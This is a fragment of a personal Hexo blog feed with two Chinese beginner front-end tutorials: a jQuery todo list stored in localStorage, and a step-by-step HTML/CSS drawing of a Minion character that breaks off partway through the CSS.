javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 读取本地存储数据</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span>  data = localStorage.getItem(<span class="string">"todolist"</span>);</span><br><span class="line">        <span class="keyword">if</span>(data !== <span class="string">""</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">           </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存本地数据</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">saveData</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        localStorage.setItem(<span class="string">"todolist"</span>, <span class="built_in">JSON</span>.stringify(data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="todolist本地存储渲染到页面"><a href="#todolist本地存储渲染到页面" class="headerlink" title="todolist本地存储渲染到页面"></a>todolist本地存储渲染到页面</h3><p>渲染一个加载操作声明一个load函数方便调用</p><p>每次读取本地数据之前都必须要将数据转化为对象的格式</p><p>遍历这个数据用(.$each()),有几条数据就生成几个li添加到ol里面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 读取本地存储的数据</span></span><br><span class="line">        <span class="keyword">var</span> data = getDate();</span><br><span class="line">        <span class="comment">// console.log(data);</span></span><br><span class="line">        <span class="comment">// 遍历之前先要清空ol里面的元素内容</span></span><br><span class="line">        $(<span class="string">"ol, ul"</span>).empty();</span><br><span class="line">        <span class="keyword">var</span> todoCount = <span class="number">0</span>; <span class="comment">// 正在进行的个数</span></span><br><span class="line">        <span class="keyword">var</span> doneCount = <span class="number">0</span>; <span class="comment">// 已经完成的个数</span></span><br><span class="line">        <span class="comment">// 遍历这个数据</span></span><br><span class="line">        $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">i, n</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// console.log(n);</span></span><br><span class="line">            <span class="keyword">if</span> (n.done) &#123;</span><br><span class="line">                $(<span class="string">"ul"</span>).prepend(<span class="string">"&lt;li&gt;&lt;input type='checkbox' checked='checked' &gt; &lt;p&gt;"</span> + n.title + <span class="string">"&lt;/p&gt; &lt;a href='javascript:;' id="</span> + i + <span class="string">" &gt;&lt;/a&gt;&lt;/li&gt;"</span>);</span><br><span class="line">                doneCount++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">"ol"</span>).prepend(<span class="string">"&lt;li&gt;&lt;input type='checkbox' &gt; &lt;p&gt;"</span> + n.title + <span class="string">"&lt;/p&gt; &lt;a href='javascript:;' id="</span> + i + <span class="string">" &gt;&lt;/a&gt;&lt;/li&gt;"</span>);</span><br><span class="line">                todoCount++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="todolist删除操作"><a href="#todolist删除操作" class="headerlink" title="todolist删除操作"></a>todolist删除操作</h3><p>点击里面a连接，不是删除的li而是删除本第存储对应数据</p><p>核心原理： 先获取本地存储数据，删除对应数据，保存本地数据重新渲染列表li</p><p>可以给链接自己定义属性记录当前的索引号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. toDoList 删除操作</span></span><br><span class="line">    $(<span class="string">"ol, ul"</span>).on(<span class="string">"click"</span>, <span class="string">"a"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// alert(11);</span></span><br><span class="line">        <span class="comment">// 先获取本地存储</span></span><br><span class="line">        <span class="keyword">var</span> data = getData();</span><br><span class="line">        <span class="comment">// 修改数据</span></span><br><span class="line">        <span class="keyword">var</span> index = $(<span class="keyword">this</span>).attr(<span class="string">"id"</span>);</span><br><span class="line">        <span class="comment">// console.log(index);</span></span><br><span class="line">        data.splice(index, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 保存到本地存储</span></span><br><span class="line">        saveDate(data);</span><br><span class="line">        <span class="comment">// 重新渲染页面</span></span><br><span class="line">        load();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="toDoList-正在进行和已完成选项操作"><a href="#toDoList-正在进行和已完成选项操作" class="headerlink" title="toDoList 正在进行和已完成选项操作"></a>toDoList 正在进行和已完成选项操作</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"ol, ul"</span>).on(<span class="string">"click"</span>, <span class="string">"input"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// alert(11);</span></span><br><span class="line">        <span class="comment">// 先获取本地存储的数据</span></span><br><span class="line">        <span class="keyword">var</span> data = getData();</span><br><span class="line">        <span class="comment">// 修改数据</span></span><br><span class="line">        <span class="keyword">var</span> index = $(<span class="keyword">this</span>).siblings(<span class="string">"a"</span>).attr(<span class="string">"id"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(index);</span><br><span class="line">        <span class="comment">// data[?].done = ?</span></span><br><span class="line">        data[index].done = $(<span class="keyword">this</span>).prop(<span class="string">"checked"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存到本地存储</span></span><br><span class="line">        saveData(data);</span><br><span class="line">        <span class="comment">// 重新渲染页面</span></span><br><span class="line">        load();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实现toDoList&quot;&gt;&lt;a href=&quot;#实现toDoList&quot; class=&quot;headerlink&quot; title=&quot;实现toDoList&quot;&gt;&lt;/a&gt;实现&lt;code&gt;toDoList&lt;/code&gt;&lt;/h2&gt;&lt;h3 id=&quot;todolist功能需求&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>纯html+css画出小黄人</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E7%BA%AFhtml+css%E7%94%BB%E5%87%BA%E5%B0%8F%E9%BB%84%E4%BA%BA/"/>
    <id>http://onekingcc.github.io/2020/06/03/纯html+css画出小黄人/</id>
    <published>2020-06-03T14:28:13.110Z</published>
    <updated>2020-11-14T06:24:17.075Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这里是为了巩固这几天学的知识所以决定写这个小案例，这里简单说一下 <a id="more"></a></p><p>首先定义个div的容器来包裹小黄人，然后 再定义一个小黄人的容器，把身体的各个部位放进去就可以。再写<code>css</code>的时候还是遇到了一些问题，不过还是学到了很多的东西的，这里首先把我的结构放出来。</p><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>mini<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 容器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 小黄人 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"minior"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 身体 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"body"</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 裤子 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"trousers"</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 吊带 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"belt"</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 左边 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 右边 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="comment">&lt;!-- 裤子左边突出矩形部分 --&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"trousers_top"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="comment">&lt;!-- 裤袋部分 --&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"packets"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="comment">&lt;!-- 三条线 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"line-left"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"line-right"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"line-bottom"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>         </span><br><span class="line">            </span><br><span class="line">               <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 头发 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hair"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hair_left"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hair_right"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 眼睛 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"eyes"</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 左眼 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_eye"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_black_eye"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_white"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            </span><br><span class="line">                        </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 右眼 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_black_eye"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_white"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 嘴巴 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mouth"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mouth_shap"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 双手 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hands"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_hand"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_hand"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 双脚 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"foot"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_foot"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_foot"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 脚底阴影 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"groundshadw"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.minior</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.body</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">240px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">115px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(249, 217, 70);</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563110236095.png" alt="1563110236095"></p><p>这里.<code>body</code>就是绘制小黄人的身体，然后这里用到了用z-index这里设置的堆叠顺序，如果拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。现在身体已经有了，接下来就是画裤子了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.trousers</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border-top</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(32, 116, 160);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563110791312.png" alt="1563110791312"></p><p>总感觉少了点啥好像还差点，这怎么看都像一个药丸，继续写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.trousers_top</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">160px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-bottom</span>: none;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">5px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(32, 116, 160);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">34px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563110979099.png" alt="1563110979099"></p><p>emmm感觉还是差点，得把吊带这些都画好</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span>,</span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">16px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(32, 116, 160);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: -<span class="number">90px</span>;</span><br><span class="line"><span class="attribute">left</span>: -<span class="number">35px</span>;</span><br><span class="line"><span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(45deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span> &#123;</span><br><span class="line"><span class="attribute">top</span>: -<span class="number">88px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">165px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-45deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span><span class="selector-pseudo">:after</span>,</span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.right</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">8px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">4px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">88px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用：after伪类来实现这里的小黑点，可以看到我用了border-radius,这里就是通过设置元素的<em>border-radius</em>值,可以轻松给元素设置圆角边框先看到下效果图吧</p><p><img src="/images/mini/1563111581677.png" alt="1563111581677"></p><p>接下直接把口袋画好和线条画好</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 口袋 */</span></span><br><span class="line"><span class="selector-class">.pockets</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">60px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">45px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">25px</span> <span class="number">25px</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">65px</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">84px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 左右两边的线条*/</span></span><br><span class="line"><span class="selector-class">.line-right</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">border-bottom-left-radius</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border-bottom</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-left</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">60px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-75deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.line-left</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">30px</span>;</span><br><span class="line"><span class="attribute">border-bottom-right-radius</span>: <span class="number">100px</span>;</span><br><span class="line"><span 